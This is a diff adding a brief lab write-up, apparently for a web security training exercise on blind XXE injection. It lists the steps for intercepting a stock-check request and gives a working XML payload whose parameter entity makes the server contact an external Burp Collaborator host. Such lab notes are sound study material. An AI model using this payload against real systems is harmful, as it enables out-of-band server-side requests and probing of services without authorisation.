@@ -1,0 +1,10 @@
+Blind XXE with out-of-band interaction via XML parameter entities
+Goal: Exploit blind XXE injection to issue a DNS lookup and HTTP request to Burp Collaborator.
+
+1)
+-Click on Product
+-Check Stock
+-Send Post to Repeater
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://oc4r73vdocvxfyt7zzyxfpcrliraf03p.oastify.com"> %xxe; ]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
